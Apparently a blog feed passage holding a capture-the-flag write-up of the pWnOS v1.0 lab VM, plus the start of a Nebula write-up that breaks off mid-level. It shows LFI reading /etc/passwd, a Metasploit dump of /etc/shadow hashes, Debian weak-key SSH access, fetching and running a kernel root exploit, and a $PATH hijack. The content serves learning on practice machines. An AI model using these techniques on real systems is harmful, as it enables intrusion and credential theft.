    <content type="html"><![CDATA[<p>I&rsquo;ve decided on a goal for 2016 to pwn as many VulnHub boxes as I can, and train myself to reach a level where I can hopefully take the OSCP. So I scrolled back in the list of VMs to start with the older ones and move towards the newer ones. Today&rsquo;s target is pWnOS v1.0, a vulnerable Linux machine that apparently contains multiple avenues for getting root</p>

<!-- more -->


<h3>Recon</h3>

<p>I fired Nmap as usual, to see what&rsquo;s listening on the box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#nmap -sT -sV 192.168.80.150
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-02-15 07:15 EST
</span><span class='line'>Nmap scan report for 192.168.80.150
</span><span class='line'>Host is up, received arp-response (0.00058s latency).
</span><span class='line'>Not shown: 995 closed ports
</span><span class='line'>Reason: 995 conn-refused
</span><span class='line'>PORT      STATE SERVICE     REASON  VERSION
</span><span class='line'>22/tcp    open  ssh         syn-ack OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
</span><span class='line'>80/tcp    open  http        syn-ack Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
</span><span class='line'>139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>445/tcp   open  netbios-ssn syn-ack Samba smbd 3.X (workgroup: MSHOME)
</span><span class='line'>10000/tcp open  http        syn-ack MiniServ 0.01 (Webmin httpd)
</span><span class='line'>MAC Address: 00:0C:29:5E:18:C9 (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>


<p>Next, I looked at the web server, and here&rsquo;s what I saw:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnos/welcome.png" title="pwnos" alt="pwnos 1.0"></p>

<p>Clicking next brought me to a not-so-typical help page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnos/help.png" title="help" alt="help"></p>

<p>No matter what skill level you choose, you will be taken to a mocking page with the text &ldquo;HAHAHAHA! , for a n00b you REALLY SUCK!&rdquo; (the n00b part comes from what you choose, so it will vary). I played a bit with the URL parameters, and when I modified <code><a href="http://192.168.80.150/index1.php?help=true&amp;connect=true">http://192.168.80.150/index1.php?help=true&amp;connect=true</a></code> to <code>connect=false</code>, the server spit back some PHP errors:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Warning: include(false) [function.include]: failed to open stream: No such file or directory in /var/www/index1.php on line 18
</span><span class='line'>
</span><span class='line'>Warning: include() [function.include]: Failed opening 'false' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/index1.php on line 18</span></code></pre></td></tr></table></div></figure>


<p>Thinking LFI, I tried to read a file from the system: <code>connect=../../../../etc/passwd</code>. No filtering in place!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>dhcp:x:100:101::/nonexistent:/bin/false
</span><span class='line'>syslog:x:101:102::/home/syslog:/bin/false
</span><span class='line'>klog:x:102:103::/home/klog:/bin/false
</span><span class='line'>mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
</span><span class='line'>obama:x:1001:1001::/home/obama:/bin/bash
</span><span class='line'>osama:x:1002:1002::/home/osama:/bin/bash
</span><span class='line'>yomama:x:1003:1003::/home/yomama:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>Cool, it looks like obama, osama and yomama have been busy making accounts on this box!</p>

<p>I looked next at the Webmin server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/pwnos/webmin.png" title="webmin" alt="webmin"></p>

<p>Tried logging in with the default credentials <em>root/root</em>, but it didn&rsquo;t work. Time to search for some exploits!</p>

<h3>Getting the /etc/shadow file</h3>

<p>There is a file disclosure vulnerability for the Webmin server, available in Metasploit:</p>

<blockquote><p>A vulnerability has been reported in Webmin and Usermin, which can be exploited by malicious people to disclose potentially sensitive
information. The vulnerability is caused due to an unspecified error within the handling of an URL. This can be exploited to read the contents
of any files on the server via a specially crafted URL, without requiring a valid login. The vulnerability has been reported in Webmin
(versions prior to 1.290) and Usermin (versions prior to 1.220).</p></blockquote>

<p>With it, I was able to pull the target&rsquo;s <em>/etc/shadow</em> file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/admin/webmin/file_disclosure
</span><span class='line'>msf auxiliary(file_disclosure) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/admin/webmin/file_disclosure):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting   Required  Description
</span><span class='line'>   ----     ---------------   --------  -----------
</span><span class='line'>   DIR      /unauthenticated  yes       Webmin directory path
</span><span class='line'>   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST                      yes       The target address
</span><span class='line'>   RPATH    /etc/passwd       yes       The file to download
</span><span class='line'>   RPORT    10000             yes       The target port
</span><span class='line'>   VHOST                      no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Auxiliary action:
</span><span class='line'>
</span><span class='line'>   Name      Description
</span><span class='line'>   ----      -----------
</span><span class='line'>   Download  
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf auxiliary(file_disclosure) &gt; set RPATH /etc/shadow
</span><span class='line'>RPATH =&gt; /etc/shadow
</span><span class='line'>msf auxiliary(file_disclosure) &gt; run
</span><span class='line'>
</span><span class='line'>[*] [2016.02.24-09:02:11] Attempting to retrieve /etc/shadow...
</span><span class='line'>[*] [2016.02.24-09:02:11] The server returned: 200 Document follows
</span><span class='line'>root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
</span><span class='line'>daemon:*:14040:0:99999:7:::
</span><span class='line'>bin:*:14040:0:99999:7:::
</span><span class='line'>sys:*:14040:0:99999:7:::
</span><span class='line'>sync:*:14040:0:99999:7:::
</span><span class='line'>games:*:14040:0:99999:7:::
</span><span class='line'>man:*:14040:0:99999:7:::
</span><span class='line'>lp:*:14040:0:99999:7:::
</span><span class='line'>mail:*:14040:0:99999:7:::
</span><span class='line'>news:*:14040:0:99999:7:::
</span><span class='line'>uucp:*:14040:0:99999:7:::
</span><span class='line'>proxy:*:14040:0:99999:7:::
</span><span class='line'>www-data:*:14040:0:99999:7:::
</span><span class='line'>backup:*:14040:0:99999:7:::
</span><span class='line'>list:*:14040:0:99999:7:::
</span><span class='line'>irc:*:14040:0:99999:7:::
</span><span class='line'>gnats:*:14040:0:99999:7:::
</span><span class='line'>nobody:*:14040:0:99999:7:::
</span><span class='line'>dhcp:!:14040:0:99999:7:::
</span><span class='line'>syslog:!:14040:0:99999:7:::
</span><span class='line'>klog:!:14040:0:99999:7:::
</span><span class='line'>mysql:!:14040:0:99999:7:::
</span><span class='line'>sshd:!:14040:0:99999:7:::
</span><span class='line'>vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
</span><span class='line'>obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
</span><span class='line'>osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
</span><span class='line'>yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>From here you can crack the hashes with our pal, John the Ripper, but I won&rsquo;t go into that, because a Nessus scan revealed a shorter route to hacking the target.</p>

<h3>Exploit</h3>

<p>The host is vulnerable to the Debian OpenSSH/OpenSSL Package Random Number Generator Weakness that allows bruteforcing with precalculated SSH keys. You can read more about it <a href="https://github.com/g0tmi1k/debian-ssh">here</a>, and also download the vulnerable keys. The vulnerability stems from the fact that the random data used by the algorithm is the PID of the process generating the key.</p>

<p>Using the earlier file disclosure module of Metasploit, it&rsquo;s possible to search the contents of the <code>.ssh/authorized_keys</code> file for each user. I didn&rsquo;t find anything for root, but obama has been in the house!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(file_disclosure) &gt; set RPATH /home/obama/.ssh/authorized_keys
</span><span class='line'>RPATH =&gt; /home/obama/.ssh/authorized_keys
</span><span class='line'>msf auxiliary(file_disclosure) &gt; run
</span><span class='line'>
</span><span class='line'>[*] [2016.02.29-05:02:52] Attempting to retrieve /home/obama/.ssh/authorized_keys...
</span><span class='line'>[*] [2016.02.29-05:02:52] The server returned: 200 Document follows
</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ== obama@ubuntuvm
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>So we know obama&rsquo;s public key, and we also have the vulnerable pregenerated keys that we downloaded earlier. So it&rsquo;s possible to search for this public key among all those keys:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/debian-ssh/common_keys/rsa/2048#grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ==
</span><span class='line'>dcbe2a56e8cdea6d17495f6648329ee2-4679.pub</span></code></pre></td></tr></table></div></figure>


<p>Great! A match has been found! I used to ssh on the box as obama (wouldn&rsquo;t it be nice to be able to do this on an actual White House computer.. xD)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/debian-ssh/common_keys/rsa/2048#ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@192.168.80.150
</span><span class='line'>Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>Last login: Mon Feb 29 04:44:43 2016 from 192.168.80.144
</span><span class='line'>obama@ubuntuvm:~$</span></code></pre></td></tr></table></div></figure>


<h3>Privilege escalation</h3>

<p>The kernel version of the system is outdated:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obama@ubuntuvm:~$ uname -a
</span><span class='line'>Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>Googling it instantly brought some good news about <code>vmsplice_to_pipe()</code>, a local privilge escalation vulnerability that affects kernels prior to 2.6.24.2. And the <a href="https://www.exploit-db.com/exploits/5092/">source</a> is available on ExploitDB. You can see that the author didn&rsquo;t lack any imagination with the name of the source code file (read the first line, it&rsquo;s hilarious) xD</p>

<p>Ok, back to business. I downloaded the file on the compromised box (had to use the <code>&mdash;no-check-certificate</code> option because I would get an error otherwise):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obama@ubuntuvm:~$ wget -O vmsplice.c https://www.exploit-db.com/download/5092 --no-check-certificate
</span><span class='line'>--05:27:51--  https://www.exploit-db.com/download/5092
</span><span class='line'>           =&gt; `vmsplice.c'
</span><span class='line'>Resolving www.exploit-db.com... 192.124.249.8
</span><span class='line'>Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
</span><span class='line'>WARNING: Certificate verification error for www.exploit-db.com: unable to get local issuer certificate
</span><span class='line'>WARNING: certificate common name `*.mycloudproxy.com' doesn't match requested host name `www.exploit-db.com'.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 6,293 (6.1K) [application/txt]
</span><span class='line'>
</span><span class='line'>100%[============================================================================================================================&gt;] 6,293         --.--K/s             
</span><span class='line'>
</span><span class='line'>05:27:52 (1.07 GB/s) - `vmsplice.c' saved [6293/6293]</span></code></pre></td></tr></table></div></figure>


<p>Compiled, and ran the code..and we are root!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>obama@ubuntuvm:~$ gcc -o vmsplice vmsplice.c
</span><span class='line'>obama@ubuntuvm:~$ ./vmsplice 
</span><span class='line'>-----------------------------------
</span><span class='line'> Linux vmsplice Local Root Exploit
</span><span class='line'> By qaaz
</span><span class='line'>-----------------------------------
</span><span class='line'>[+] mmap: 0x0 .. 0x1000
</span><span class='line'>[+] page: 0x0
</span><span class='line'>[+] page: 0x20
</span><span class='line'>[+] mmap: 0x4000 .. 0x5000
</span><span class='line'>[+] page: 0x4000
</span><span class='line'>[+] page: 0x4020
</span><span class='line'>[+] mmap: 0x1000 .. 0x2000
</span><span class='line'>[+] page: 0x1000
</span><span class='line'>[+] mmap: 0xb7e4b000 .. 0xb7e7d000
</span><span class='line'>[+] root
</span><span class='line'>root@ubuntuvm:~# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Challenge completed! :D</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Q: How many IBM types does it take to   \
</span><span class='line'>| change a light bulb? A: Fifteen. One to |
</span><span class='line'>| do it, and fourteen to write document   |
</span><span class='line'>| number                                  |
</span><span class='line'>|                                         |
</span><span class='line'>| GC7500439-0001, Multitasking            |
</span><span class='line'>| Incandescent Source System Facility,    |
</span><span class='line'>|                                         |
</span><span class='line'>| of which 10% of the pages state only    |
</span><span class='line'>| "This page intentionally                |
</span><span class='line'>|                                         |
</span><span class='line'>| left blank", and 20% of the definitions |
</span><span class='line'>| are of the form "A:.....                |
</span><span class='line'>|                                         |
</span><span class='line'>| consists of sequences of non-blank      |
</span><span class='line'>\ characters separated by blanks".        /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula levels 00-10]]></title>
    <link href="http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10/"/>
    <updated>2016-01-09T09:50:44-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10</id>
    <content type="html"><![CDATA[<p><a href="https://exploit-exercises.com/">exploit-exercises.com</a> provides a variety of virtual machines, documentation and challenges that can be used to learn about a variety of computer security issues such as privilege escalation, vulnerability analysis, exploit development, debugging, reverse engineering, and general cyber security issues.</p>

<p>Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at</p>

<ul>
<li>  SUID files</li>
<li>  Permissions</li>
<li>  Race conditions</li>
<li>  Shell meta-variables</li>
<li>  $PATH weaknesses</li>
<li>  Scripting language weaknesses</li>
<li>  Binary compilation failures</li>
</ul>


<p>At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.</p>

<p>I am doing these levels by SSH&#8217;ing into the box, rather than directly in the Nebula terminal.</p>

<p>Because my posts tend to become gigantic when I am focusing on a single challenge and it takes alot of time between them, I am going to break them up into smaller posts from now on, hence why I will cover only the levels from 00 to 10 in this post.</p>

<!-- more -->


<h3>Level00</h3>

<p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>

<p>Alternatively, look at the find man page.</p>

<p>To access this level, log in as level00 with the password of level00.</p>

<p>After logging in, use the <em>find</em> command like this: <code>sudo find / -user flag00 -perm -4000 -print 2> /dev/null</code>. It prints all SUID files of the flag00 user and all error output is thrown in the black hole. So you will find the binary in <code>/rofs/bin/&hellip;/flag00</code>. You could also have looked for it directly, by noticing the rofs folder which doesn&rsquo;t normally exist in a Linux installation. Run the binary and you will see this message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Congrats, now run getflag to get your flag!</span></code></pre></td></tr></table></div></figure>


<p>Run getflag and level complete:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level01</h3>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>

<p>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is a SUID program owned by the flag01 user. When run it outputs <em>and now what?</em>. The <em>env</em> program is the one that actually invokes the <em>echo</em> command, and it doesn&rsquo;t use an absolute path. <em>env</em> runs a program in a modified environment and it looks in the  $PATH for the executable it&rsquo;s supposed to run. So we can make an executable of our own, name it <em>echo</em>, and add it to the path, so that it will take precedence over the others.</p>

<p>First, let&rsquo;s see our current path:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:~$ echo $PATH
</span><span class='line'>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m going to add my <em>echo</em> program to the path to be searched before anywhere else:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:~$ PATH=/tmp:$PATH
</span><span class='line'>level01@nebula:~$ echo $PATH
</span><span class='line'>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>And now create an <em>echo</em> file in <em>/tmp/</em>, that will run <em>getflag</em> (and make it executable):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:/tmp$ cat echo 
</span><span class='line'>/bin/getflag</span></code></pre></td></tr></table></div></figure>


<p>Now go back and run the <em>flag01</em> binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:/home/flag01$ ./flag01 
